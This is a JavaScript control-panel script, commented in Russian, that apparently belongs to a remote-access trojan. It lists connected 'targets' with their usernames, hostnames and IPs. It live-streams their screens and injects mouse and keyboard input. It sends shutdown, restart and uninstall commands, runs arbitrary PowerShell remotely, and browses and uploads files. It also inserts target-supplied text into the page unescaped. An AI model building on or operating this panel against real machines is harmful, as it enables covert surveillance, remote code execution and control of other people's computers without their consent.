// Конфигурация
const CONFIG = {
    SERVER_URL: window.location.origin,
    SCREEN_FPS: 30,
    REFRESH_INTERVAL: 5000,
    HEARTBEAT_INTERVAL: 30000,
    QUALITY: 50
};

// Глобальные переменные
let currentTarget = null;
let screenInterval = null;
let targetsInterval = null;
let isStreaming = false;
let lastScreenTime = 0;
let frameTimes = [];
let canvasContext = null;
let isDragging = false;
let mouseStartPos = null;
let pendingCommand = null;

// Инициализация
document.addEventListener('DOMContentLoaded', function() {
    initCanvas();
    initEventListeners();
    loadTargets();
    startAutoRefresh();
    
    // Периодическая проверка активности
    setInterval(checkTargetActivity, 60000);
});

// Инициализация canvas
function initCanvas() {
    const canvas = document.getElementById('screenCanvas');
    canvasContext = canvas.getContext('2d');
    
    // Обработка кликов по canvas
    canvas.addEventListener('click', handleScreenClick);
    canvas.addEventListener('mousedown', handleMouseDown);
    canvas.addEventListener('mouseup', handleMouseUp);
    canvas.addEventListener('mousemove', handleMouseMove);
    canvas.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        if (currentTarget) {
            sendMouseCommand('click', 'right', null, 
                e.offsetX / canvas.width, e.offsetY / canvas.height);
        }
    });
}

// Обработчики событий
function initEventListeners() {
    // Обновление целей
    document.getElementById('refreshTargets').addEventListener('click', loadTargets);
    document.getElementById('autoRefresh').addEventListener('click', toggleAutoRefresh);
    
    // Управление потоком
    document.getElementById('startStream').addEventListener('click', startScreenStream);
    document.getElementById('stopStream').addEventListener('click', stopScreenStream);
    document.getElementById('fullscreenBtn').addEventListener('click', toggleFullscreen);
    document.getElementById('screenshotBtn').addEventListener('click', captureScreenshot);
    
    // Качество
    document.getElementById('qualitySelect').addEventListener('change', function() {
        CONFIG.QUALITY = parseInt(this.value);
        if (isStreaming) {
            stopScreenStream();
            setTimeout(startScreenStream, 100);
        }
    });
    
    // Вкладки
    document.querySelectorAll('.tab-btn').forEach(tab => {
        tab.addEventListener('click', function() {
            switchTab(this.dataset.tab);
        });
    });
    
    // Управление мышью
    document.querySelectorAll('.mouse-btn, .scroll-btn, .action-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            if (!currentTarget) return;
            
            const action = this.dataset.action;
            const button = this.dataset.button;
            const direction = this.dataset.direction;
            
            if (action === 'drag') {
                toggleDragMode();
            } else {
                sendMouseCommand(action, button, direction);
            }
        });
    });
    
    // Клавиатура
    document.getElementById('sendTextBtn').addEventListener('click', sendTextCommand);
    document.getElementById('keyboardInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            sendTextCommand();
        }
    });
    
    document.querySelectorAll('.key-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            if (!currentTarget) return;
            sendKeyCommand(this.dataset.key);
        });
    });
    
    // Системные команды
    document.querySelectorAll('.sys-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            if (!currentTarget) return;
            
            const command = this.dataset.command;
            const isDangerous = ['shutdown', 'restart', 'uninstall'].includes(command);
            
            if (isDangerous) {
                showConfirmation(
                    `Confirm ${command.toUpperCase()}`,
                    `Are you sure you want to ${command} the target system?`,
                    () => sendSystemCommand(command)
                );
            } else {
                sendSystemCommand(command);
            }
        });
    });
    
    // Файлы
    document.getElementById('browseFiles').addEventListener('click', browseFiles);
    document.getElementById('uploadFile').addEventListener('click', () => {
        document.getElementById('fileInput').click();
    });
    document.getElementById('downloadFile').addEventListener('click', downloadFile);
    document.getElementById('goPath').addEventListener('click', goToPath);
    document.getElementById('fileInput').addEventListener('change', handleFileUpload);
    
    // Расширенные команды
    document.querySelectorAll('.adv-btn, .client-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            if (!currentTarget) return;
            sendAdvancedCommand(this.dataset.command);
        });
    });
    
    document.getElementById('executeCode').addEventListener('click', executeCode);
    
    // Информация
    document.getElementById('refreshInfo').addEventListener('click', updateTargetInfo);
    
    // Модальное окно
    document.getElementById('modalConfirm').addEventListener('click', confirmAction);
    document.getElementById('modalCancel').addEventListener('click', hideModal);
    
    // Горячие клавиши
    document.addEventListener('keydown', handleHotkeys);
}

// Обработка горячих клавиш
function handleHotkeys(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
    
    // Ctrl+Alt+ комбинации
    if (e.ctrlKey && e.altKey) {
        switch(e.key) {
            case '1':
            case '2':
            case '3':
            case '4':
            case '5':
            case '6':
            case '7':
            case '8':
            case '9':
                const index = parseInt(e.key) - 1;
                selectTargetByIndex(index);
                break;
            case 's':
                if (!isStreaming) startScreenStream();
                break;
            case 'q':
                if (isStreaming) stopScreenStream();
                break;
            case 'f':
                toggleFullscreen();
                break;
            case 'c':
                if (currentTarget) captureScreenshot();
                break;
        }
    }
}

// Загрузка списка целей
async function loadTargets() {
    try {
        showNotification('Loading targets...', 'info');
        
        const response = await fetch(`${CONFIG.SERVER_URL}/api/targets`);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const targets = await response.json();
        displayTargets(targets);
        updateStats(targets);
        
        // Автовыбор первой активной цели
        if (!currentTarget && targets.length > 0) {
            const activeTarget = targets.find(t => t.online);
            if (activeTarget) {
                selectTarget(activeTarget);
            }
        }
        
    } catch (error) {
        console.error('Failed to load targets:', error);
        showNotification('Failed to load targets', 'error');
    }
}

// Отображение целей
function displayTargets(targets) {
    const container = document.getElementById('targetsList');
    
    if (targets.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-desktop"></i>
                <p>No systems connected</p>
                <small>Run the client on target systems</small>
            </div>
        `;
        return;
    }
    
    container.innerHTML = '';
    
    targets.forEach(target => {
        const targetElement = document.createElement('div');
        targetElement.className = 'target-item';
        if (currentTarget && currentTarget.id === target.id) {
            targetElement.classList.add('active');
        }
        
        const lastSeen = target.last_seen ? 
            formatTimeAgo(target.last_seen) : 'Never';
        
        targetElement.innerHTML = `
            <div class="target-header">
                <div class="target-name">
                    <span class="status-dot ${target.online ? 'online' : 'offline'}"></span>
                    ${target.username || 'Unknown'}@${target.hostname || 'Unknown'}
                </div>
                <span class="target-id">${target.id.substring(0, 8)}...</span>
            </div>
            <div class="target-details">
                <div>OS: ${target.os || 'Unknown'}</div>
                <div>IP: ${target.ip || 'Unknown'}</div>
                <div>Last: ${lastSeen}</div>
            </div>
        `;
        
        targetElement.addEventListener('click', () => selectTarget(target));
        container.appendChild(targetElement);
    });
}

// Обновление статистики
function updateStats(targets) {
    const onlineCount = targets.filter(t => t.online).length;
    const totalCount = targets.length;
    
    document.getElementById('onlineCount').textContent = onlineCount;
    document.getElementById('totalCount').textContent = totalCount;
}

// Форматирование времени
function formatTimeAgo(timestamp) {
    const now = Date.now();
    const diff = now - timestamp;
    
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return `${Math.floor(diff / 86400000)}d ago`;
}

// Выбор цели
async function selectTarget(target) {
    currentTarget = target;
    
    // Обновление UI
    document.querySelectorAll('.target-item').forEach(item => {
        item.classList.remove('active');
    });
    
    const targetElement = Array.from(document.querySelectorAll('.target-item'))
        .find(el => el.querySelector('.target-id').textContent.includes(target.id.substring(0, 8)));
    
    if (targetElement) targetElement.classList.add('active');
    
    // Обновление информации
    updateTargetInfo();
    
    // Обновление статуса
    updateStatus();
    
    // Автозапуск потока
    if (target.online && !isStreaming) {
        setTimeout(() => {
            if (currentTarget && currentTarget.id === target.id) {
                startScreenStream();
            }
        }, 500);
    } else if (!target.online && isStreaming) {
        stopScreenStream();
    }
    
    showNotification(`Selected: ${target.username}@${target.hostname}`, 'success');
}

// Обновление информации о цели
function updateTargetInfo() {
    if (!currentTarget) {
        document.getElementById('targetInfo').innerHTML = `
            <div class="empty-state">
                <i class="fas fa-desktop"></i>
                <p>No target selected</p>
            </div>
        `;
        return;
    }
    
    document.getElementById('infoOs').textContent = currentTarget.os || 'Unknown';
    document.getElementById('infoArch').textContent = currentTarget.architecture || 'Unknown';
    document.getElementById('infoCpu').textContent = currentTarget.processor || 'Unknown';
    document.getElementById('infoRam').textContent = currentTarget.ram_gb ? 
        `${currentTarget.ram_gb} GB` : 'Unknown';
    document.getElementById('infoIp').textContent = currentTarget.ip || 'Unknown';
    document.getElementById('infoHostname').textContent = currentTarget.hostname || 'Unknown';
    document.getElementById('infoUser').textContent = currentTarget.username || 'Unknown';
    document.getElementById('infoLastSeen').textContent = currentTarget.last_seen ? 
        formatTimeAgo(currentTarget.last_seen) : 'Never';
    document.getElementById('infoUptime').textContent = currentTarget.uptime || '0s';
    document.getElementById('infoActive').textContent = currentTarget.online ? 'Yes' : 'No';
}

// Обновление статуса
function updateStatus() {
    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('connectionStatusText');
    const targetName = document.getElementById('currentTargetName');
    const screenName = document.getElementById('screenTargetName');
    
    if (!currentTarget) {
        statusDot.className = 'status-dot';
        statusText.textContent = 'Disconnected';
        statusText.style.color = '#888';
        targetName.textContent = 'None Selected';
        screenName.textContent = 'No Target';
        return;
    }
    
    if (currentTarget.online) {
        statusDot.className = 'status-dot online';
        statusText.textContent = 'Connected';
        statusText.style.color = '#00ff88';
    } else {
        statusDot.className = 'status-dot offline';
        statusText.textContent = 'Offline';
        statusText.style.color = '#ff5555';
    }
    
    targetName.textContent = `${currentTarget.username}@${currentTarget.hostname}`;
    screenName.textContent = `${currentTarget.username}@${currentTarget.hostname}`;
}

// Запуск потоковой передачи
function startScreenStream() {
    if (!currentTarget || !currentTarget.online || isStreaming) return;
    
    isStreaming = true;
    document.getElementById('screenOverlay').style.display = 'none';
    document.getElementById('startStream').disabled = true;
    document.getElementById('stopStream').disabled = false;
    
    showNotification('Starting screen stream...', 'info');
    
    // Очистка canvas
    const canvas = document.getElementById('screenCanvas');
    canvasContext.clearRect(0, 0, canvas.width, canvas.height);
    
    // Запуск интервала обновления
    const interval = 1000 / CONFIG.SCREEN_FPS;
    screenInterval = setInterval(updateScreen, interval);
    
    // Первый кадр
    updateScreen();
}

// Остановка потока
function stopScreenStream() {
    isStreaming = false;
    
    if (screenInterval) {
        clearInterval(screenInterval);
        screenInterval = null;
    }
    
    document.getElementById('screenOverlay').style.display = 'flex';
    document.getElementById('startStream').disabled = false;
    document.getElementById('stopStream').disabled = true;
    
    document.getElementById('fpsValue').textContent = '0';
    document.getElementById('latencyValue').textContent = '0ms';
    document.getElementById('resolutionInfo').textContent = '0x0';
    document.getElementById('streamingStatus').textContent = 'No';
    
    showNotification('Screen stream stopped', 'warning');
}

// Обновление экрана
async function updateScreen() {
    if (!currentTarget || !isStreaming) return;
    
    const startTime = performance.now();
    
    try {
        const response = await fetch(`${CONFIG.SERVER_URL}/api/screen/${currentTarget.id}?quality=${CONFIG.QUALITY}`);
        
        if (response.status === 200) {
            const data = await response.json();
            
            if (data.screen && data.screen.length > 100) {
                // Отображение изображения
                await drawScreen(data.screen);
                
                // Обновление информации
                updateScreenInfo(data);
                
                // Расчет FPS
                updateFPS(startTime);
                
                // Обновление времени
                document.getElementById('lastUpdate').textContent = 'Just now';
                
                return true;
            }
        } else if (response.status === 404) {
            // Данных еще нет
            document.getElementById('screenOverlay').style.display = 'flex';
            document.getElementById('screenOverlay').innerHTML = `
                <i class="fas fa-clock"></i>
                <h3>Waiting for data...</h3>
                <p>Target may be offline or not sending data</p>
            `;
        }
    } catch (error) {
        console.error('Screen update failed:', error);
        stopScreenStream();
        showNotification('Stream connection lost', 'error');
    }
    
    return false;
}

// Отображение изображения на canvas
async function drawScreen(base64Data) {
    return new Promise((resolve, reject) => {
        const img = new Image();
        img.onload = function() {
            const canvas = document.getElementById('screenCanvas');
            
            // Установка размеров canvas
            canvas.width = img.width;
            canvas.height = img.height;
            
            // Отрисовка
            canvasContext.clearRect(0, 0, canvas.width, canvas.height);
            canvasContext.drawImage(img, 0, 0);
            
            // Обновление информации о разрешении
            document.getElementById('resolutionInfo').textContent = 
                `${img.width}x${img.height}`;
            
            resolve();
        };
        
        img.onerror = reject;
        img.src = `data:image/jpeg;base64,${base64Data}`;
    });
}

// Обновление информации об экране
function updateScreenInfo(data) {
    if (data.timestamp) {
        const age = Date.now() - data.timestamp;
        document.getElementById('latencyValue').textContent = `${age}ms`;
    }
    
    document.getElementById('streamingStatus').textContent = 'Yes';
}

// Расчет FPS
function updateFPS(startTime) {
    const now = performance.now();
    const frameTime = now - startTime;
    
    frameTimes.push(frameTime);
    if (frameTimes.length > 30) frameTimes.shift();
    
    const avgFrameTime = frameTimes.reduce((a, b) => a + b) / frameTimes.length;
    const fps = Math.round(1000 / avgFrameTime);
    
    document.getElementById('fpsValue').textContent = fps;
}

// Захват скриншота
function captureScreenshot() {
    if (!currentTarget) return;
    
    const canvas = document.getElementById('screenCanvas');
    if (canvas.width === 0 || canvas.height === 0) return;
    
    const link = document.createElement('a');
    link.download = `screenshot_${currentTarget.hostname}_${Date.now()}.png`;
    link.href = canvas.toDataURL('image/png');
    link.click();
    
    showNotification('Screenshot saved', 'success');
}

// Переключение полноэкранного режима
function toggleFullscreen() {
    const elem = document.querySelector('.screen-viewer');
    
    if (!document.fullscreenElement) {
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    } else {
        if (document.exitFullscreen) {
            document.exitFullscreen();
        } else if (document.webkitExitFullscreen) {
            document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) {
            document.msExitFullscreen();
        }
    }
}

// Переключение вкладок
function switchTab(tabName) {
    // Обновление кнопок
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    
    document.querySelector(`.tab-btn[data-tab="${tabName}"]`).classList.add('active');
    
    // Обновление контента
    document.querySelectorAll('.tab-pane').forEach(pane => {
        pane.classList.remove('active');
    });
    
    document.getElementById(`${tabName}-tab`).classList.add('active');
}

// Обработка кликов по экрану
function handleScreenClick(e) {
    if (!currentTarget || !isStreaming) return;
    
    const canvas = document.getElementById('screenCanvas');
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    
    sendMouseCommand('click', 'left', null, x, y);
}

// Обработка мыши
function handleMouseDown(e) {
    if (!currentTarget || !isStreaming) return;
    
    const canvas = document.getElementById('screenCanvas');
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    
    mouseStartPos = { x, y };
    
    if (e.button === 0) { // Левая кнопка
        sendMouseCommand('mousedown', 'left', null, x, y);
    } else if (e.button === 2) { // Правая кнопка
        sendMouseCommand('mousedown', 'right', null, x, y);
    }
}

function handleMouseUp(e) {
    if (!currentTarget || !isStreaming) return;
    
    const canvas = document.getElementById('screenCanvas');
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    
    if (e.button === 0) {
        sendMouseCommand('mouseup', 'left', null, x, y);
    } else if (e.button === 2) {
        sendMouseCommand('mouseup', 'right', null, x, y);
    }
    
    mouseStartPos = null;
}

function handleMouseMove(e) {
    if (!currentTarget || !isStreaming || !mouseStartPos) return;
    
    const canvas = document.getElementById('screenCanvas');
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    
    sendMouseCommand('move', null, null, x, y);
}

// Включение/выключение режима перетаскивания
function toggleDragMode() {
    isDragging = !isDragging;
    const canvas = document.getElementById('screenCanvas');
    
    if (isDragging) {
        canvas.style.cursor = 'grabbing';
        showNotification('Drag mode enabled', 'info');
    } else {
        canvas.style.cursor = 'crosshair';
        showNotification('Drag mode disabled', 'info');
    }
}

// Отправка команд
async function sendMouseCommand(action, button, direction, x, y) {
    const command = {
        type: 'mouse',
        data: {
            action: action,
            button: button,
            direction: direction,
            x: x,
            y: y,
            timestamp: Date.now()
        }
    };
    
    await sendCommand(command);
}

async function sendKeyCommand(key) {
    const command = {
        type: 'keyboard',
        data: {
            action: 'press',
            key: key,
            timestamp: Date.now()
        }
    };
    
    await sendCommand(command);
}

async function sendTextCommand() {
    const input = document.getElementById('keyboardInput');
    const text = input.value.trim();
    
    if (!text) return;
    
    const command = {
        type: 'keyboard',
        data: {
            action: 'type',
            text: text,
            timestamp: Date.now()
        }
    };
    
    await sendCommand(command);
    input.value = '';
    showNotification(`Text sent: ${text.substring(0, 50)}...`, 'success');
}

async function sendSystemCommand(cmd) {
    const command = {
        type: 'system',
        data: {
            command: cmd,
            timestamp: Date.now()
        }
    };
    
    await sendCommand(command);
    showNotification(`System command sent: ${cmd}`, 'success');
}

async function sendAdvancedCommand(cmd) {
    const command = {
        type: 'advanced',
        data: {
            command: cmd,
            timestamp: Date.now()
        }
    };
    
    await sendCommand(command);
    showNotification(`Advanced command sent: ${cmd}`, 'success');
}

async function executeCode() {
    const code = document.getElementById('codeInput').value.trim();
    if (!code) return;
    
    const command = {
        type: 'execute',
        data: {
            code: code,
            language: 'powershell',
            timestamp: Date.now()
        }
    };
    
    await sendCommand(command);
    showNotification('Code execution requested', 'info');
}

// Отправка команды на сервер
async function sendCommand(command) {
    if (!currentTarget) {
        showNotification('No target selected', 'error');
        return null;
    }
    
    try {
        const response = await fetch(`${CONFIG.SERVER_URL}/api/commands`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                target_id: currentTarget.id,
                command: command
            })
        });
        
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const result = await response.json();
        return result;
        
    } catch (error) {
        console.error('Command failed:', error);
        showNotification('Command failed to send', 'error');
        return null;
    }
}

// Работа с файлами
async function browseFiles() {
    if (!currentTarget) return;
    
    const path = document.getElementById('filePath').value;
    const command = {
        type: 'files',
        data: {
            action: 'list',
            path: path,
            timestamp: Date.now()
        }
    };
    
    const result = await sendCommand(command);
    if (result && result.files) {
        displayFileList(result.files);
    }
}

function displayFileList(files) {
    const container = document.getElementById('fileList');
    container.innerHTML = '';
    
    if (files.length === 0) {
        container.innerHTML = '<p>No files found</p>';
        return;
    }
    
    files.forEach(file => {
        const div = document.createElement('div');
        div.className = 'file-item';
        div.innerHTML = `
            <i class="fas ${file.isDirectory ? 'fa-folder' : 'fa-file'}"></i>
            <span>${file.name}</span>
            <span class="file-size">${file.size || ''}</span>
        `;
        
        if (file.isDirectory) {
            div.addEventListener('click', () => {
                document.getElementById('filePath').value = file.fullPath;
                browseFiles();
            });
        }
        
        container.appendChild(div);
    });
}

async function handleFileUpload(e) {
    const file = e.target.files[0];
    if (!file || !currentTarget) return;
    
    const reader = new FileReader();
    reader.onload = async function(e) {
        const command = {
            type: 'files',
            data: {
                action: 'upload',
                filename: file.name,
                data: e.target.result.split(',')[1], // Убираем data URL префикс
                timestamp: Date.now()
            }
        };
        
        await sendCommand(command);
        showNotification(`File uploaded: ${file.name}`, 'success');
    };
    
    reader.readAsDataURL(file);
    e.target.value = '';
}

async function downloadFile() {
    // Реализация загрузки файла
    showNotification('Download feature not implemented', 'warning');
}

function goToPath() {
    browseFiles();
}

// Управление автообновлением
function startAutoRefresh() {
    if (targetsInterval) clearInterval(targetsInterval);
    targetsInterval = setInterval(loadTargets, CONFIG.REFRESH_INTERVAL);
    
    document.getElementById('autoRefresh').classList.add('active');
    document.getElementById('autoRefresh').innerHTML = '<i class="fas fa-pause"></i>';
}

function stopAutoRefresh() {
    if (targetsInterval) {
        clearInterval(targetsInterval);
        targetsInterval = null;
    }
    
    document.getElementById('autoRefresh').classList.remove('active');
    document.getElementById('autoRefresh').innerHTML = '<i class="fas fa-play"></i>';
}

function toggleAutoRefresh() {
    if (targetsInterval) {
        stopAutoRefresh();
    } else {
        startAutoRefresh();
    }
}

// Проверка активности целей
async function checkTargetActivity() {
    try {
        const response = await fetch(`${CONFIG.SERVER_URL}/api/targets`);
        const targets = await response.json();
        
        if (currentTarget) {
            const updatedTarget = targets.find(t => t.id === currentTarget.id);
            if (updatedTarget) {
                currentTarget.online = updatedTarget.online;
                currentTarget.last_seen = updatedTarget.last_seen;
                
                if (!updatedTarget.online && isStreaming) {
                    stopScreenStream();
                    showNotification('Target went offline', 'error');
                }
                
                updateStatus();
            }
        }
    } catch (error) {
        console.error('Activity check failed:', error);
    }
}

// Утилиты
function selectTargetByIndex(index) {
    const targets = document.querySelectorAll('.target-item');
    if (index < targets.length) {
        targets[index].click();
    }
}

function showNotification(message, type = 'info') {
    const container = document.getElementById('notificationContainer');
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas ${getNotificationIcon(type)}"></i>
            <span>${message}</span>
        </div>
    `;
    
    container.appendChild(notification);
    
    // Автоматическое удаление
    setTimeout(() => {
        notification.style.opacity = '0';
        notification.style.transform = 'translateX(100%)';
        setTimeout(() => notification.remove(), 300);
    }, 5000);
}

function getNotificationIcon(type) {
    switch(type) {
        case 'success': return 'fa-check-circle';
        case 'error': return 'fa-exclamation-circle';
        case 'warning': return 'fa-exclamation-triangle';
        default: return 'fa-info-circle';
    }
}

function showConfirmation(title, message, callback) {
    document.getElementById('modalTitle').textContent = title;
    document.getElementById('modalMessage').textContent = message;
    document.getElementById('confirmModal').style.display = 'flex';
    
    pendingCommand = callback;
}

function confirmAction() {
    if (pendingCommand) {
        pendingCommand();
        pendingCommand = null;
    }
    hideModal();
}

function hideModal() {
    document.getElementById('confirmModal').style.display = 'none';
    pendingCommand = null;
}

// Обработчик изменения полноэкранного режима
document.addEventListener('fullscreenchange', updateFullscreenButton);
document.addEventListener('webkitfullscreenchange', updateFullscreenButton);
document.addEventListener('mozfullscreenchange', updateFullscreenButton);
document.addEventListener('MSFullscreenChange', updateFullscreenButton);

function updateFullscreenButton() {
    const btn = document.getElementById('fullscreenBtn');
    const isFullscreen = document.fullscreenElement || 
                        document.webkitFullscreenElement || 
                        document.mozFullScreenElement || 
                        document.msFullscreenElement;
    
    if (isFullscreen) {
        btn.innerHTML = '<i class="fas fa-compress"></i> Exit Fullscreen';
    } else {
        btn.innerHTML = '<i class="fas fa-expand"></i> Fullscreen';
    }
}

// Экспорт для отладки
window.RC = {
    config: CONFIG,
    currentTarget,
    isStreaming,
    loadTargets,
    startScreenStream,
    stopScreenStream,
    sendCommand
};